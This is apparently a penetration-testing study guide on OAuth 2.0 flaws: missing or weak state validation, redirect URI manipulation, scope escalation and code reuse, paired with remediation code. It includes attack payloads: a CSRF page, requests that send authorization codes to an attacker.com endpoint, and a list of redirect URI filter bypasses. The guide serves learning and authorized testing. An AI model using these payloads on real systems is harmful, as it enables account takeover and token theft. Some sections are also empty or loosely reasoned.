OAuth 2.0 Vulnerabilities

Exploit insecure OAuth implementations to hijack user accounts, escalate privileges, or steal sensitive data.

Critical BSCP Exam Topic Difficulty: Intermediate-Advanced

Real-World Analogy

The Valet Key Analogy

You're at a fancy hotel and hand the valet your car keys. Rather than handing over your full key ring, the concierge gives the valet a special "valet key" that only unlocks the car door and starts the engine ·it can't open the trunk or glove compartment. OAuth works the same way: instead of giving a third-party app your password, you give it a limited-access token. But if the hotel doesn't verify the valet is actually from their service, or if the valet key somehow works on all doors in the parking garage, your security breaks down. Similarly, if OAuth implementations don't properly validate authorization codes, check state parameters, or verify redirect URIs, an attacker can steal codes, impersonate users, or escalate their privileges.

How It Works

OAuth 2.0 is an authorization delegation protocol. Instead of giving a third-party app your password, you grant it temporary, limited-scope access to your account on another service (e.g., "Login with Google").

The Authorization Code Flow

This is the most common and secure OAuth flow:

  1. User clicks "Login with Google" on MyApp
  2. MyApp redirects to Google's authorization server: https://accounts.google.com/oauth/authorize?client_id=123&redirect_uri=https://myapp.com/callback&state=random&scope=email+profile
  3. User logs in and grants consent on Google's website
  4. Google redirects back to MyApp: https://myapp.com/callback?code=AUTH_CODE&state=random
  5. MyApp exchanges the code for an access token (backend to Google, includes client_secret)
  6. MyApp receives access_token: {"access_token": "token123", "token_type": "Bearer"}
  7. MyApp uses token to fetch user info: GET /userinfo?access_token=token123
  8. User is logged in

Key Parameters

  • client_id: Identifies the app requesting access (public, not secret)
  • client_secret: Secret used by the app to exchange code for token (must be kept private)
  • redirect_uri: Where the authorization server redirects after user consent. Must match the registered URI exactly
  • code: Temporary authorization code (valid for seconds to minutes, single-use)
  • state: Random string to prevent CSRF attacks. Must match between request and response
  • scope: Permissions being requested (email, profile, payment info, etc.)
  • access_token: Bearer token used to access protected resources

Vulnerability Types

1. Missing State Parameter

If the app doesn't use the state parameter, CSRF attacks are possible. An attacker can forge a link that completes OAuth flow on their own account, then trick a victim into clicking it, linking the attacker's OAuth account to the victim's session.

2. Weak State Parameter

If state is predictable (sequential, timestamp-based, or hardcoded), an attacker can forge valid state values.

3. State Not Validated

If the application doesn't check that the returned state matches the one sent, attackers can inject a different code with a forged state.

4. Redirect URI Not Validated

If the application allows flexible redirect_uri values, an attacker can redirect the authorization code to their own server:

// Attacker changes redirect_uri to their domain
GET https://google.com/oauth/authorize?
  client_id=legitimate_app&
  redirect_uri=https://attacker.com/steal&
  scope=email+profile&
  state=xyz

// Code is sent to attacker instead of legitimate app:
GET https://attacker.com/steal?code=STOLEN_CODE&state=xyz

5. Implicit Flow Token Leakage

The Implicit flow (legacy) returns access tokens directly in the URL fragment, which can be logged, stored in browser history, or leaked to third parties.

6. Account Hijacking via Email Reuse

If the app doesn't re-verify the email returned by OAuth, an attacker can register an account with OAuth (using Google), and if a victim later tries to link their Google account, the attacker's account gets linked instead.

7. Scope Escalation

An attacker modifies the OAuth request to request elevated scopes (e.g., scope=email+profile+payment) instead of the legitimate app's scopes.

8. Open Redirect on Authorization Server

If the authorization server has an open redirect vulnerability, an attacker can redirect the user to a phishing page before the authorization code is sent.

Where to Look

OAuth vulnerabilities appear on login pages and authorization endpoints. Search for "Login with Google/GitHub/Facebook" buttons and authorization flows:

Key Locations

  • Login Pages: "Sign in with Google", "Sign in with GitHub", "Sign in with Facebook"
  • Account Linking Pages: Settings where users can link OAuth providers to their account
  • Authorization Endpoints: /oauth/authorize, /auth/authorize, /login/oauth
  • Callback Endpoints: /oauth/callback, /auth/callback, /login/callback
  • Token Exchange Endpoints: /oauth/token (usually backend only)

Testing Approach

  1. Initiate OAuth login flow and capture the authorization request
  2. Examine the state parameter (is it present? is it random?)
  3. Examine the redirect_uri parameter (does it point to the app's domain?)
  4. Examine the scope parameter (what permissions are requested?)
  5. Complete the flow and intercept the callback URL
  6. Check if the state in the response matches the state in the request

Burp Suite Workflow

1
Initiate OAuth Flow
Click the "Login with [Provider]" button on the target site. Burp should capture the redirect to the authorization server. If not, use Proxy → Intercept to capture it.
2
Examine Authorization Request
In Repeater, examine the authorization URL. Look for state, redirect_uri, client_id, scope. Note the values.
3
Test State Parameter
Drop the request to the authorization server (don't complete the redirect). Initiate the flow again and try dropping it at a different stage. Try modifying the state parameter (change it to a different value) and see if the app complains.
4
Test Redirect URI Validation
Try modifying the redirect_uri parameter to point to attacker.com or a different subdomain. Complete the flow and see if the authorization code is sent to your modified URI instead of the legitimate app.
5
Test Scope Escalation
Modify the scope parameter to request elevated permissions (e.g., change scope=email to scope=email+profile+payment). Consent and see if the app accepts the elevated scope.
6
Intercept Callback
After user consents, intercept the callback request to your app. Examine the code and state parameters. Note if state was validated.
7
Test Code Reuse
Capture an authorization code, then try reusing it in another request. If accepted, this indicates the code wasn't invalidated after first use.

Payloads & Techniques

State Parameter CSRF Attack

If state is missing or not validated, craft a CSRF attack:

<!DOCTYPE html>
<html>
<body>
<img src="https://myapp.com/oauth/authorize?
  client_id=legitimate_app&
  redirect_uri=https://myapp.com/callback&
  state=arbitrary_value&
  scope=email+profile" />

<!-- When victim visits this page, OAuth flow initiates with attacker-controlled state -->
</body>
</html>

Redirect URI Manipulation

If the authorization server allows flexible redirect_uri, steal the authorization code:

// Step 1: Craft malicious authorization URL
GET https://accounts.google.com/oauth/authorize?
  client_id=legitimate_app&
  redirect_uri=https://attacker.com/steal&
  state=xyz&
  scope=email+profile

// Step 2: Attacker's /steal endpoint receives:
GET https://attacker.com/steal?code=STOLEN_CODE&state=xyz

// Step 3: Exchange code for token using legitimate_app's client_secret
POST https://accounts.google.com/oauth/token
  client_id=legitimate_app&
  client_secret=SECRET&
  code=STOLEN_CODE&
  redirect_uri=https://attacker.com/steal

Scope Escalation

Modify the scope parameter to request elevated permissions:

// Original
GET https://accounts.google.com/oauth/authorize?
  client_id=app&
  scope=email

// Modified (escalated)
GET https://accounts.google.com/oauth/authorize?
  client_id=app&
  scope=email+profile+payment

Authorization Code Interception

Intercept the callback URL containing the authorization code:

// Callback URL (captured in browser):
GET https://myapp.com/callback?code=AUTH_CODE&state=xyz

// Extract the code and exchange it for access_token
POST /oauth/token
  code=AUTH_CODE&
  client_id=app&
  client_secret=secret&
  redirect_uri=https://myapp.com/callback

Testing Redirect URI Variations

If the app validates redirect_uri with a regex or prefix matching, bypass it:

// Original redirect_uri: https://myapp.com/callback
// Attacker tries:
https://attacker.com?redirect_to=https://myapp.com/callback
https://myapp.com.attacker.com/callback
https://myapp.com:@attacker.com/callback
https://myapp.com@attacker.com/callback
https://myapp.com%2e%61ttacker.com
https://myapp.com#attacker.com

Account Linking via Email Reuse

WAF Bypass & Variations

Redirect URI Parser Confusion

Different systems parse URLs differently. Exploit this discrepancy:

  • Port confusion: https://myapp.com:8080@attacker.com (@ is treated as userinfo separator)
  • Fragment usage: https://myapp.com#attacker.com (fragment might be ignored)
  • Path injection: https://attacker.com/myapp.com (if regex only checks prefix)
  • Subdomain wildcards: https://xxx.myapp.com (if app trusts *.myapp.com)
  • URL encoding: https://attacker.com%2fmyapp.com (double encoding confusion)
  • Case sensitivity: https://MyApp.com vs https://myapp.com

State Parameter Bypass

  • Hardcoded state: If the app always uses the same state value, CSRF is possible
  • Null state: Some implementations might accept state=null or state="" (unlikely but test)
  • Empty state: Try removing the state parameter entirely

Scope Escalation Variations

Try different separator formats:

// Typical
scope=email+profile

// Try alternatives
scope=email%20profile
scope=email,profile
scope=email profile
scope=email;profile

Authorization Server Open Redirects

If the authorization server itself has an open redirect vulnerability in parameters like login_hint or display, exploit that to create a phishing chain.

Exploitation & Impact

Exploitation Scenarios

Account Takeover via State Parameter CSRF

If state is missing or not validated, an attacker can trick a victim into clicking a malicious link that initiates OAuth with the attacker-controlled state. The authorization code is sent back with the attacker's state value, allowing the attacker to intercept and use it.

Redirect URI Bypass to Code Theft

An attacker modifies the redirect_uri to point to their server. The authorization code is sent to the attacker instead of the legitimate app. Using the client_id and client_secret (if not protected), the attacker exchanges the code for an access token and impersonates the user.

Unauthorized Scope Escalation

An attacker requests elevated scopes (payment info, admin functions, data export) on behalf of a user. If the user is not notified of the escalation, the attacker gains access to sensitive functions.

Account Linking Hijacking

During account linking, if email is not re-verified, an attacker can link their OAuth account to a victim's email, taking over the account.

Authorization Code Reuse

If authorization codes are not invalidated after use or if they don't expire quickly, an attacker can replay captured codes.

Real-World Example

A travel app uses "Login with Google" but doesn't validate the state parameter. An attacker sends a malicious link to users: https://travel-app.com/oauth/authorize?state=attacker_value&...&redirect_uri=https://attacker.com. When victims click, their authorization code is sent to the attacker's server. The attacker uses the code to create an account linked to the victim's Google identity, gaining access to the victim's travel history, bookings, and payment methods.

Impact

  • Critical: Account takeover, privilege escalation, unauthorized access to sensitive features
  • High: Unauthorized scope access, email re-binding without verification
  • Medium: CSRF, state parameter not validated, authorization code not single-use

Remediation

1. Always Use and Validate State Parameter

Generate a cryptographically random state value for each authorization request and validate it in the callback:

// Server-side: Generate random state
state = secureRandomBytes(32).toString('hex');
session.state = state;

// Send authorization request
redirect(authServer + '?state=' + state + '...');

// Callback: Validate state
if (request.state !== session.state) {
  throw new Error('State mismatch - CSRF detected');
}

2. Strictly Validate Redirect URI

Never allow flexible redirect_uri values. Use an exact match against a whitelist:

const ALLOWED_REDIRECTS = [
  'https://myapp.com/oauth/callback',
  'https://api.myapp.com/oauth/callback'
];

if (!ALLOWED_REDIRECTS.includes(request.redirectUri)) {
  throw new Error('Invalid redirect_uri');
}

3. Use PKCE for Public Clients

Proof Key for Code Exchange (PKCE) adds an extra layer of security by making authorization codes useless if stolen:

// Client generates code_verifier and code_challenge
code_verifier = secureRandomBytes(32).toString('base64url');
code_challenge = sha256(code_verifier).toString('base64url');

// Send authorization with code_challenge
GET /authorize?code_challenge=...&code_challenge_method=S256

// Exchange code with code_verifier
POST /token
  code=...&
  code_verifier=...

4. Re-verify Email During Account Linking

Never trust the email from OAuth without re-verification:

// After OAuth, send verification email
email = oauthResponse.email;
verificationToken = generateToken();
sendVerificationEmail(email, verificationToken);

// Only link account after email verification
if (verificationToken === request.token) {
  linkAccount(user, oauthIdentity);
}

5. Enforce Single-Use Authorization Codes

Invalidate authorization codes immediately after use and set short expiration (30 seconds):

// Generate code with expiry
code = {
  value: secureRandom(),
  expiresAt: now + 30000,
  used: false
};

// Validate on exchange
if (code.used || code.expiresAt < now) {
  throw new Error('Code invalid or expired');
}
code.used = true;

6. Minimize Scopes Requested

Only request scopes absolutely necessary for functionality. Let users see and approve requested permissions.

7. Use Authorization Server Securely

  • Keep client_secret truly secret (never expose in client-side code)
  • Use HTTPS for all OAuth endpoints
  • Validate authorization server certificates

8. Implement Secure Session Management

After successful OAuth authentication, create a secure session token and don't rely solely on the OAuth access token:

// After OAuth succeeds
sessionToken = generateSecureToken();
session[sessionToken] = {
  user: oauthUser,
  expiresAt: now + 3600000
};

// Subsequent requests use sessionToken, not OAuth token

Common Beginner Mistakes

Not Testing State Parameter Thoroughly

Mistake: Checking if state exists but not testing if it's actually validated.

Fix: Modify the state value in both the request and response. If the flow still completes, state is not being validated. This is a CSRF vulnerability.

Assuming Redirect URI Validation is Strict

Mistake: Trying only attacker.com and giving up when it's rejected, without testing variations.

Fix: Test parser confusion techniques: subdomains, ports, URL encoding, fragments, path injection. Different systems parse URLs differently.

Not Checking for PKCE Implementation

Mistake: Assuming PKCE is always used, or not understanding its absence indicates vulnerability.

Fix: Check if code_challenge and code_verifier are used. If absent, code interception is more dangerous. Note this in your report.

Overlooking Email Re-verification**

Mistake: Not testing the account linking feature or assuming email is automatically re-verified.

Fix: Test account linking by intercepting the OAuth response and changing the email. If the app links without re-verification, this is a critical vulnerability.

Not Testing Code Reuse**

Mistake: Assuming authorization codes are always single-use and expiring quickly.

Fix: Capture an authorization code, exchange it, then try exchanging the same code again. If it works, code reuse is possible.

Giving Up on Scope Escalation**

Mistake: Testing only the exact scopes the app requests, not attempting to escalate.

Fix: Always try adding extra scopes (payment, admin, export, etc.). If the app accepts them without special notification, this is a vulnerability.

Not Testing All OAuth Providers**

Mistake: Testing only one provider (Google) and assuming others have the same implementation.

Fix: Test every OAuth provider on the login page. Each may have different validation logic.
